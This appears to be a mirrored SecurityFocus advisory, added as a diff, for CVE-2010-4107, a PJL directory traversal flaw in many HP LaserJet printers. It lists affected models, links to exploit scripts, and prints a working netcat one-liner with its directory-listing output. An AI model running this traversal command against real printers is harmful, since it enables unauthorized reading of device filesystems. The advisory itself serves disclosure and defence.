@@ -1,0 +1,160 @@
+#SpeeDr00t@Black Falcon<br>#bid44882<p><b><span style="font-size: 18pt;">HP Multiple LaserJet Printers PJL Directory Traversal Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/44882/info">info</a><br><a href="http://www.securityfocus.com/bid/44882/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/44882/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/44882/solution">solution</a><br><a href="http://www.securityfocus.com/bid/44882/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				44882
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2010-4107<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 15 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 06 2014 12:41AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Moritz Jodeit, n.runs AG
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					HP LaserJet M9050 MFP  0<br/>
+					
+				
+					HP LaserJet M4345x MFP  0<br/>
+					
+				
+					HP LaserJet M1522n MFP  0<br/>
+					
+				
+					HP LaserJet 9050 MFP  0<br/>
+					
+				
+					HP LaserJet 9000MFP  <br/>
+					
+				
+					HP LaserJet 9000  <br/>
+					
+				
+					HP LaserJet 8150  <br/>
+					
+				
+					HP LaserJet 5035 MFP  0<br/>
+					
+				
+					HP LaserJet 4345mfp  0<br/>
+					
+				
+					HP LaserJet 4345 MFP  0<br/>
+					
+				
+					HP LaserJet 4300  <br/>
+					
+				
+					HP LaserJet 4200  <br/>
+					
+				
+					HP LaserJet 4100MFP  <br/>
+					
+				
+					HP LaserJet 4100  <br/>
+					
+				
+					HP LaserJet 3035 MFP  0<br/>
+					
+				
+					HP LaserJet  5100 Series<br/>
+					
+				
+					HP Color LaserJet CM4730 MFP  0<br/>
+					
+				
+					HP Color LaserJet 9500mfp  0<br/>
+					
+				
+					HP Color LaserJet 6040 MFP  0<br/>
+					
+				
+					HP Color LaserJet 4730mfp  0<br/>
+					
+				
+					HP Color LaserJet 4730 MFP  0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x45000/44882/44882.rb">#exploit_44882.rb</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x45000/44882/44882-2.rb">#exploit_44882-2.rb</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x45000/44882/44882.pl">#exploit_44882.pl</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit this issue via a browser.<br/><br/>The following example data is available:<br/><br/>$ python -c 'print "\x1b%-12345X () PJL FSDIRLIST NAME=\"0:\\..\\..\\..\\\"   ENTRY=1 COUNT=999999\x0d\x0a\x1b%-12345X\x0d\x0a"' | nc 192.168.0.1 9100<br/>@PJL FSDIRLIST NAME="0:\..\..\..\" ENTRY=1<br/>. TYPE=DIR<br/>.. TYPE=DIR<br/>tmp TYPE=DIR<br/>etc TYPE=DIR<br/>xps TYPE=DIR<br/>dsk_ide2a TYPE=DIR<br/>dsk_ColorIQ TYPE=DIR<br/>dsk_CustomIQ TYPE=DIR<br/>bootdev TYPE=DIR<br/>dsk_jdi TYPE=DIR<br/>dsk_jdi_ss TYPE=DIR<br/>dsk_af TYPE=DIR<br/>lrt TYPE=DIR<br/>webServer TYPE=DIR<br/><br/>The following exploits are available:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/44882.rb">/data/vulnerabilities/exploits/44882.rb</a></li>
+<li><a href="/data/vulnerabilities/exploits/44882-2.rb">/data/vulnerabilities/exploits/44882-2.rb</a></li>
+<li><a href="/data/vulnerabilities/exploits/44882.pl">/data/vulnerabilities/exploits/44882.pl</a></li>
+</ul>
+</div>
